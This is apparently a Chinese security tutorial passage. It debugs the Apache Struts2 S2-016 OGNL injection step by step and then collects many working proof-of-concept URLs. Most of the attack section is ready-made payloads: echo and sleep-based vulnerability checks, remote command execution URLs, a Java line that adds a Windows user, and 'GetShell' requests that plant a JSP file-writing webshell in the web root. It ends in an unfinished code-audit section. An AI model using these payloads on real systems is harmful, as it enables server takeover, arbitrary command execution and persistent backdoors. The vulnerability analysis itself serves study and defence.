S2-011-S2-015:[http://blog.csdn.net/wangyi\_lin/article/details/9273903](http://blog.csdn.net/wangyi_lin/article/details/9273903) [http://www.inbreak.net/archives/487](http://www.inbreak.net/archives/487) [http://www.inbreak.net/archives/507](http://www.inbreak.net/archives/507)

S2-016-S2-017：[http://www.iteye.com/news/28053#comments](http://www.iteye.com/news/28053#comments)

##### 吐槽一下：

从来没有见过一个框架如此多的漏洞一个连官方修补没怎么用心的框架既有如此多的拥护者。大学和很多的培训机构都把SSH（Spring、Struts2、Hibernate）奉为JavaEE缺一不可的神话。在政府和大型企业中使用JavaWeb的项目中SSH架构体现的更是无处不在。刚开始找工作的出去面试基本上都问：SSH会吗？我们只招本科毕业精通SSH框架的。“？什么？Struts2不会？啥？还不是本科学历？很遗憾，**我们公司更希望跟研究过SSH代码精通Struts MVC、Spring AOP DI OIC和Hibernate的人合作，您先回去等通知吧……** ”。多么标准的面试失败的结束语，我只想说：我去年买了个表！

在Struts2如此“权威”、“专制”统治下终于有一个比Struts2更轻盈、更精巧、更安全的框架开始逐渐的威胁着Struts神一样的地位，It’s SpringMvc。

#### **Struts2 Debug：**

关于Struts2的漏洞分析网上已经铺天盖地了，因为一直做SpringMvc开发对Struts2并是怎么关注。不过有了上面的铺垫，分析下Struts2的逻辑并不难。这次就简单的跟一下S2-016的命令执行吧。

##### **Debug Tips：**
```
F5：进入方法
F6：单步执行
F7：从当前方法中跳出，继续往下执行。
F8：跳到下一个断点。
其他：F3：进入方法内、Ctrl+alt+h查看当前方法在哪些地方有调用到。
```
这里还得从上面的Struts2的Filter说起,忘记了的回头看上面的：Struts2请求处理流程分析。

在Struts2项目启动的时候就也会去调用Ognl做初始化，启动后一切的Struts2的请求都会先经过Struts2的StrutsPrepareAndExecuteFilter过滤器（在早期的Struts里默认的是FilterDispatcher）。并从其doFilter开始处理具体的请求，完成Action映射和请求分发。

在Debug之前需要有Struts2的OGNL、Xwork还有Struts的代码。其中的xwork和Struts2的源代码可以在Struts2\\struts-2.3.14\\src下找到。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517203131117%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

Ognl的源码在opensymphony的官方网站可以直接下载到。需要安装SVN客户端checkout下源码。

[http://code.google.com/p/opensymphony-ognl-backup/source/checkout](http://code.google.com/p/opensymphony-ognl-backup/source/checkout)

关联上源代码后可以在web.xml里面找到StrutsPrepareAndExecuteFilter哪行配置，直接Ctrl+左键点进去（或者直接在StrutsPrepareAndExecuteFilter上按F3快速进入到这个类里面去）。在StrutsPrepareAndExecuteFilter的77行行标处双击下就可以断点了。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517203145509%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

至于在Eclipse里面怎么去关联源代码就不多说了，按照eclipse提示找到源代码所在的路径就行了，实在不懂就百度一下。一个正常的Action请求一般情况下是不会报错的。如：[http://localhost/StrutsDemo/test.action](http://localhost/StrutsDemo/test.action)请求处理成功。在这样正常的请求中Ognl表达式找的是location。而注入Ognl表达式之后：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517203205275%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)doFilter的前面几行代码在做初始化，而第84行就开始映射action了。而最新的S2-016就是因为不当的处理action映射导致OGNL注入执行任意代码的。F5进入PrepareOperations的findActionMapping方法。在findActionMapping里面会去调用先去获取一个容器然后再去映射具体的action。通过Dispatcher对象（org.apache.struts2.dispatcher）去获取Container。通过ActionMapper的实现类：org.apache.struts2.dispatcher.mapper.DefaultActionMapper调用getMapping方法，获取mapping。-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517203220835%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

在311行的handleSpecialParameters(request, mapping);F5进入方法执行内部，这个方法在DefaultActionMapper类里边。-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517203237493%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

从请求当中获取我们提交的恶意Ognl代码：-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517203257956%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

handleSpecialParameters方法调用parameterAction.execute(key, mapping);：-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517203317495%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

F5进入parameterAction.execute：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517203335559%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

执行完成之后的mapping可以看到lication已经注入了我们的Ognl表达式了：-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517203359426%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

当mapping映射完成后，会回到DefaultActionMapper调用上面处理后的mapping解析ActionName。-

    return parseActionName(mapping)

这里拿到的name自然是test了。因为我们访问的只是test.action。不过在Struts2里面还可以用test!show.action即调用test内的show方法。
```
parseNameAndNamespace(uri, mapping, configManager);
handleSpecialParameters(request, mapping);
return parseActionName(mapping);
```

parseActionName执行完成后回到之前的findActionMapping方法。然后把我们的mapping放到请求作用域里边，而mapping对应的键是：struts.actionMapping。此便完成了ActionMapping。那么StrutsPrepareAndExecuteFilter类的doFilter过滤器中的84行的ActionMapping也就完成了。

并不是说action映射完成后就已经执行了Ognl表达式了，而是在StrutsPrepareAndExecuteFilter类第91行的execute.executeAction(request, response, mapping);执行完成后才会去执行我们的Ognl。

executeAction 在org.apache.struts2.dispatcher.ng的ExecuteOperations类。这个方法如下：
```
/**
     * Executes an action
     * @throws ServletException
     */
    public void executeAction(HttpServletRequest request, HttpServletResponse response, ActionMapping 
            mapping) throws ServletException {
        dispatcher.serviceAction(request, response, servletContext, mapping);
    }
```
Dispatcher应该是再熟悉不过了，因为刚才已经在dispatcher里面转悠了一圈回来。现在调用的是dispatcher的 serviceAction方法。

`public void serviceAction`(参数在上面executeAction太长了就不写了)：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F2018051720351273%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

Excute在`excuteorg.apache.struts2.dispatcher.ServletRedirectResult`类，具体方法如下：-
```
public void execute(ActionInvocation invocation) throws Exception {
        if (anchor != null) {
            anchor = conditionalParse(anchor, invocation);
        }
        super.execute(invocation);
    }
    super.execute(org.apache.struts2.dispatcher.StrutsResultSupport)
```

即执行其父类的execute方法。上面的anchor为空。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517203542926%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

重点就在translateVariables（翻译变量的时候把我们的Ognl执行了）-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517203552805%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517203603991%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

```
Object result = parser.evaluate(openChars, expression, ognlEval, maxLoopCount);
    return conv.convertValue(stack.getContext(), result, asType);
```

最终执行：-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517203631597%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)

F8放过页面输出\[/ok\]：-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdn.net%2F20180517203644103%3Fwatermark%2F2%2Ftext%2FaHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM%3D%2Ffont%2F5a6L5L2T%2Ffontsize%2F400%2Ffill%2FI0JBQkFCMA%3D%3D%2Fdissolve%2F70)-

#### **解密Struts2的“神秘”的POC：**

在S2-016出来之后Struts2以前的POC拿着也没什么用了，因为S2-016的威力已经大到让百度、企鹅、京东叫唤了。挑几个简单的具有代表性的讲下。在连续不断的看了这么多坑爹的概念以后不妨见识一下Struts2的常用POC。

**回显POC**(快速检测是否存在（有的s2版本无法输出）,看见输出\[/ok\]就表示存在)：

POC1:

```bash
http://127.0.0.1/Struts2/test.action?('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\[email protected]@EMPTY_SET')(c))&(g)(('\43xman\[email protected]@getResponse()')(d))&(i2)(('\43xman.getWriter().println(%22[/ok]%22)')(d))&(i99)(('\43xman.getWriter().close()')(d))
```

POC2（类型转换漏洞需要把POC加在整型参数上）:

```bash
http://127.0.0.1/Struts2/test.action?id='%2b(%23_memberAccess[%22allowStaticMethodAccess%22]=true,@[email protected]().getWriter().println(%22[/ok]%22))%2b'
```

POC3（需要注意这里也必须是加载一个String(字符串类型)的参数后面，使用的时候把URL里面的两个foo替换成目标参数（注意POC里面还有个foo））:  

```perl
http://127.0.0.1/Struts2/hello.action?foo=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=%20new%20java.lang.Boolean(false),%23_memberAccess[%22allowStaticMethodAccess%22]=new%20java.lang.Boolean(true),@[email protected]().getWriter().println(%22[/ok]%22))&z[(foo)('meh')]=true
```

POC4:

```perl
http://127.0.0.1/Struts2/hello.action?class.classLoader.jarPath=(%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d=+new+java.lang.Boolean(false),%23_memberAccess%5b%22allowStaticMethodAccess%22%5d=true,%23s3cur1ty=%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23s3cur1ty.println(%22[/ok]%22),%23s3cur1ty.close())(aa)&x[(class.classLoader.jarPath)('aa')]
```

POC5:

```perl
http://127.0.0.1/Struts2/hello.action?a=1${%23_memberAccess[%22allowStaticMethodAccess%22]=true,[email protected]@getResponse().getWriter().println(%22[/ok]%22),%23response.close()}
```

POC6:

```perl
http://127.0.0.1/Struts2/$%7B%23_memberAccess[%22allowStaticMethodAccess%22]=true,[email protected]@getResponse().getWriter(),%23resp.println(%22[ok]%22),%23resp.close()%7D.action
```

POC7:

```perl
http://localhost/Struts2/test.action?redirect:${%23w%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23w.println('[/ok]'),%23w.flush(),%23w.close()}
```


**@[\[email protected\]](http://drops.leesec.com/cdn-cgi/l/email-protection)().getWriter().println(%22\[/ok\]%22)**其实是静态调用**ServletActionContext**上面已经讲过了ServletActionContext能够拿到真正的HttpServletRequest、HttpServletResponse、ServletContext忘记了的回头看去。**拿到一个HttpServletResponse响应对象后就可以调用getWriter方法(返回的是PrintWriter)让Servlet容器上输出\[/ok\]了，而其他的POC也都做了同样的事：拿到HttpServletResponse，然后输出\[/ok\]。**其中的allowStaticMethodAccess在Struts2里面默认是false，也就是默认不允许静态方法调用。

#### **精确判断是否存在（延迟判断）:**
POC1:

```bash
http://127.0.0.1/Struts2/test.action?('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\[email protected]@EMPTY_SET')(c))&(d)(([email protected]@sleep(5000)')(d)) 
```

POC2:

```bash
http://127.0.0.1/Struts2/test.action?id='%2b(%23_memberAccess[%22allowStaticMethodAccess%22]=true,@[email protected](5000))%2b' 
```

POC3:

```perl
http://127.0.0.1/Struts2/hello.action?foo=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,@[email protected](5000))(meh%29&z[%28foo%29%28%27meh%27%29]=true 
```

POC4：

```perl
http://127.0.0.1/Struts2/hello.action?class.classLoader.jarPath=(%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3d+new+java.lang.Boolean(false)%2c+%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c[email protected](5000))(aa)&x[(class.classLoader.jarPath)('aa')] 
```

POC5：

```crystal
http://127.0.0.1/Struts2/hello.action?a=1${%23_memberAccess[%22allowStaticMethodAccess%22]=true,@[email protected](5000)} 
```

POC6:

```crystal
http://127.0.0.1/Struts2/${%23_memberAccess[%22allowStaticMethodAccess%22]=true,@[email protected](5000)}.action
```

之前很多的利用工具都是让线程睡一段时间再去计算时间差来判断漏洞是否存在。这样比之前的回显更靠谱，缺点就是慢。而实现这个POC的方法同样是非常的简单其实就是静态调用java.lang.Thread.sleep(5000)就行了。而命令执行原理也是一样的。
之前很多的利用工具都是让线程睡一段时间再去计算时间差来判断漏洞是否存在。这样比之前的回显更靠谱，缺点就是慢。而实现这个POC的方法同样是非常的简单其实就是静态调用java.lang.Thread.sleep(5000)就行了。而命令执行原理也是一样的。

#### **命令执行：**

关于回显：webStr\\75new\\40byte\[100\] 修改为合适的长度。


其实在Java里面要去执行一个命令的方式都是一样的，简单的静态调用方式
POC1:

```delphi
http://127.0.0.1/Struts2/test.action?('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\[email protected]@EMPTY_SET')(c))&(g)(('\43req\[email protected]@getRequest()')(d))&(h)(('\43webRootzpro\[email protected]@getRuntime().exec(\43req.getParameter(%22cmd%22))')(d))&(i)(('\43webRootzproreader\75new\40java.io.DataInputStream(\43webRootzpro.getInputStream())')(d))&(i01)(('\43webStr\75new\40byte[100]')(d))&(i1)(('\43webRootzproreader.readFully(\43webStr)')(d))&(i111)('\43webStr12\75new\40java.lang.String(\43webStr)')(d))&(i2)(('\43xman\[email protected]@getResponse()')(d))&(i2)(('\43xman\[email protected]@getResponse()')(d))&(i95)(('\43xman.getWriter().println(\43webStr12)')(d))&(i99)(('\43xman.getWriter().close()')(d))&cmd=cmd%20/c%20ipconfig 
```

POC2:

```scala
http://127.0.0.1/Struts2/test.action?id='%2b(%23_memberAccess[%22allowStaticMethodAccess%22]=true,[email protected]@getRequest(),[email protected]@getRuntime().exec(%23req.getParameter(%22cmd%22)),%23iswinreader=new%20java.io.DataInputStream(%23exec.getInputStream()),%23buffer=new%20byte[100],%23iswinreader.readFully(%23buffer),%23result=new%20java.lang.String(%23buffer),[email protected]@getResponse(),%23response.getWriter().println(%23result))%2b'&cmd=cmd%20/c%20ipconfig 
```

POC3:

```perl
http://127.0.0.1/freecms/login_login.do?user.loginname=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=%20new%20java.lang.Boolean(false),%23_memberAccess[%22allowStaticMethodAccess%22]=new%20java.lang.Boolean(true),[email protected]@getRequest(),[email protected]@getRuntime().exec(%23req.getParameter(%22cmd%22)),%23iswinreader=new%20java.io.DataInputStream(%23exec.getInputStream()),%23buffer=new%20byte[1000],%23iswinreader.readFully(%23buffer),%23result=new%20java.lang.String(%23buffer),[email protected]@getResponse(),%23response.getWriter().println(%23result))&z[(user.loginname)('meh')]=true&cmd=cmd%20/c%20set
```

POC4:

```perl
http://127.0.0.1/Struts2/test.action?class.classLoader.jarPath=(%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d=+new+java.lang.Boolean(false),%23_memberAccess%5b%22allowStaticMethodAccess%22%5d=true,[email protected]@getRequest(),%23a=%40java.lang.Runtime%40getRuntime().exec(%23req.getParameter(%22cmd%22)).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char%5b50000%5d,%23c.read(%23d),%23s3cur1ty=%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23s3cur1ty.println(%23d),%23s3cur1ty.close())(aa)&x[(class.classLoader.jarPath)('aa')]&cmd=cmd%20/c%20netstat%20-an 
```

POC5：

```perl
http://127.0.0.1/Struts2/hello.action?a=1${%23_memberAccess[%22allowStaticMethodAccess%22]=true,[email protected]@getRequest(),[email protected]@getRuntime().exec(%23req.getParameter(%22cmd%22)),%23iswinreader=new%20java.io.DataInputStream(%23exec.getInputStream()),%23buffer=new%20byte[1000],%23iswinreader.readFully(%23buffer),%23result=new%20java.lang.String(%23buffer),[email protected]@getResponse(),%23response.getWriter().println(%23result),%23response.close()}&cmd=cmd%20/c%20set
```

POC6:

```perl
http://localhost/struts2-blank/example/HelloWorld.action?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{'netstat','-an'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}
```

其实在Java里面要去执行一个命令的方式都是一样的，简单的静态调用方式

```scss
java.lang.Runtime.getRuntime().exec("net user selina 123 /add");
```

就可以执行任意命令了。Exec执行后返回的类型是java.lang.Process。Process是一个抽象类，`final class ProcessImpl extends Process`也是Process的具体实现。而命令执行后返回的Process可以通过

```scss
public OutputStream getOutputStream()public InputStream getInputStream()
```

直接输入输出流，拿到InputStream之后直接读取就能够获取到命令执行的结果了。而在Ognl里面不能够用正常的方式去读取流，而多是用DataInputStream的readFully或BufferedReader的read方法全部读取或者按byte读取的。因为可能会读取到半个中文字符，所以可能会存在乱码问题，自定义每次要读取的大小就可以了。POC当中的/c 不是必须的，执行dir之类的命令可以加上。

    Process java.lang.Runtime.exec(String command) throws IOException
    

![2013072423412230696.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=http%3A%2F%2Fdrops.leesec.com%2Fwooyun-img%2F49916ccd47d80de8473fc9711b4382c6f37306b6.jpg)

![2013072423413593661.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=http%3A%2F%2Fdrops.leesec.com%2Fwooyun-img%2Fe884515c09d83633d23da048071533dec8852b79.jpg)

#### **GetShell POC：**

poc1:

```perl
http://127.0.0.1/Struts2/test.action?('\u0023_memberAccess[\'allowStaticMethodAccess\']')(meh)=true&(aaa)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023foo')(\u0023foo\u003dnew%20java.lang.Boolean(%22false%22)))&(i1)(('\43req\[email protected]@getRequest()')(d))&(i12)(('\43xman\[email protected]@getResponse()')(d))&(i13)(('\43xman.getWriter().println(\43req.getServletContext().getRealPath(%22\u005c%22))')(d))&(i2)(('\43fos\75new\40java.io.FileOutputStream(new\40java.lang.StringBuilder(\43req.getRealPath(%22\u005c%22)).append(@[email protected]).append(%22css3.jsp%22).toString())')(d))&(i3)(('\43fos.write(\43req.getParameter(%22p%22).getBytes())')(d))&(i4)(('\43fos.close()')(d))&p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e
```

POC2（类型转换漏洞需要把POC加在整型参数上）:

```perl
http://127.0.0.1/Struts2/test.action?id='%2b(%23_memberAccess[%22allowStaticMethodAccess%22]=true,[email protected]@getRequest(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22)).append(%23req.getParameter(%22p%22)).close())%2b'%20&p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e
```

POC3（需要注意这里也必须是加载一个String(字符串类型)的参数后面，使用的时候把URL里面的两个foo替换成目标参数（注意POC里面还有个foo））:

```perl
http://127.0.0.1/Struts2/hello.action?foo=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,[email protected]@getRequest(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22)).append(%23req.getParameter(%22p%22)).close())(meh%29&z[%28foo%29%28%27meh%27%29]=true&p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e
```

POC4:

```perl
http://127.0.0.1/Struts2/hello.action?class.classLoader.jarPath=(%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d=+new+java.lang.Boolean(false),%23_memberAccess%5b%22allowStaticMethodAccess%22%5d=true,[email protected]@getRequest(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22)).append(%23req.getParameter(%22p%22)).close()(aa)&x[(class.classLoader.jarPath)('aa')]&p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e
```

POC5:

```perl
http://127.0.0.1/Struts2/hello.action?a=1${%23_memberAccess[%22allowStaticMethodAccess%22]=true,[email protected]@getRequest(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22)).append(%23req.getParameter(%22p%22)).close()}&p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e
```

POC6:

```perl
http://localhost/Struts2/test.action?redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23p%3d(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22).replaceAll("\\\\", "/"),new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close()}&c=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e
```

比如POC4当中首先就是把allowStaticMethodAccess改为trute即允许静态方法访问。然后再获取请求对象，从请求对象中获取网站项目的根路径，然后在根目录下新建一个css3.jsp，而css3.jsp的内容同样来自于客户端的请求。POC4中的p就是传入的参数，只要获取p就能获取到内容完成文件的写入了。之前已经说过**Java不是动态的脚本语言，所以没有eval。不能像PHP那样直接用eval去动态执行，所以Java里面没有真正意义上的一句话木马。菜刀只是提供了一些常用的一句话的功能的具体的实现，所以菜刀的代码会很长，因为这些代码在有eval的情况下是可以通过发送请求的形式去构造的，在这里就必须把代码给上传到服务器去编译成执行。**
#### **Struts2:**

关于修补仅提供思路，具体的方法和补丁不提供了。Struts2默认后缀是action或者不写后缀，有的改过代码的可能其他后缀如.htm、.do，那么我们只要拦截这些请求进行过滤就行了。

```scss
1、  从CDN层可以拦截所有Struts2的请求过滤OGNL执行代码2、  从Server层在请求Struts2之前拦截其Ognl执行。3、  在项目层面可以在struts2的filter加一层拦截4、  在Struts2可以用拦截器拦截5、  在Ognl源码包可以拦截恶意的Ognl请求6、  实在没办法就打补丁7、  终极解决办法可以考虑使用其他MVC框架
```
# 攻击JavaWeb应用程序架构与代码审计



不管多么强大的系统总会有那么些安全问题，影响小的可能仅仅只会影响用户体验，危害性大点的可能会让攻击者获取到服务器权限。这一节重点是怎样去找到并利用问题去获取一些有意思的东西。



有MM的地方就有江湖，有程序的地方就有漏洞。现在已经不是SQL注入漫天的年代了，Java的一些优秀的开源框架让其项目坚固了不少。在一个中大型的Web应用漏洞的似乎永远都存在，只是在于影响的大小、发现的难易等问题。有很多比较隐晦的漏洞需要在了解业务逻辑甚至是查看源代码才能揪出来。JavaWeb跟PHP和ASP很大的不同在于其安全性相对来说更高。但是具体体现在什么地方？JavaWeb开发会有那些问题？这些正是我们今天讨论的话题。

## JavaWeb开发概念

---

### Java分层思想

通过前面几章的介绍相信已经有不少的朋友对Jsp、Servlet有一定了解了。上一节讲MVC的有说的JSP+Servlet构成了性能好但开发效率并不高的Model2。在JavaWeb开发当中一般会分出很多的层去做不同的业务。

#### 常见的分层

```scss
1、展现层(View 视图) 2、控制层（Controller 控制层） 3、服务层（Service） 4、实体层（entity 实体对象、VO(value object) 值对象 、模型层（bean）。5、业务逻辑层BO(business object) 6、持久层（dao- Data Access Object 数据访问层、PO(persistant object) 持久对象）复制代码
```

### 依赖关系

在了解一个项目之前至少要知道它的主要业务是什么主要的业务逻辑和容易出现问题的环节。其次是了解项目的结构和项目当中的类依赖。再次才是去根据业务模块去读对应的代码。从功能去关联业务代码入手往往比逮着段代码就看效率高无数倍。

前几天在Iteye看到一款不错的生成项目依赖图的工具- Structure101，试用了下Structure101感觉挺不错的，不过是收费的而且价格昂贵。用Structure101生成Jeebbs的项目架构图：

Structure101导入jeebss架构图-包调用： ￼

Structure101包调用详情：

Structure101可以比较方便的去生成类关系图、调用图等。Jeebbs项目比较大，逻辑相对复杂，不过可以看下我的半成品的博客系统。

项目图：

架构图：

控制层：

调用流程（demo还没处理异常，最好能try catch下用上面的logger记录一下）： ￼

## 漏洞发掘基础

---

Eclipse采用的是SWT编写，俗称万能IDE拥有各种语言的插件可以写。Myeclipse是Eclipse的插件版，功能比eclipse更简单更强大。

导入Web项目到Myeclipse，Myeclipse默认提供了主流的Server可以非常方便的去部署你的Web项目到对应的Server上，JavaWeb容器异常之多，而ASP、 PHP的容器却相对较少。容器可能除了开发者有更多的选择外往往意味着需要调试程序在不同的Server半桶的版本的表现，这是让人一件非常崩溃的事。

调试开源的项目需下载源码到本地然后导入部署，如果没有源代码怎么办？一般情况下JavaWeb程序不会去混淆代码，所以通过之前的反编译工具就能够比较轻松的拿到源代码。但是反编译过来的源代码并不能够直接作用于debug。不过对我们了解程序逻辑和结构有了非常大的帮助，根据逻辑代码目测基本上也能完成debug。 ￼

在上一节已经讲过了一个客户端的请求到达服务器端后，后端会去找到这个URL所在的类，然后调用业务相关代码完成请求的处理，最后返回处理完成后的内容。跟踪请求的方式一般是先找到对应的控制层，然后深入到具体的逻辑代码当中。另一种方法是事先到dao或业务逻辑层去找漏洞，然后逆向去找对应的控制层。最直接的如model1、model2并不用那么费劲直接代码在jsp、servlet代码里面就能找到一大堆业务逻辑。

### 按业务类型有序测试

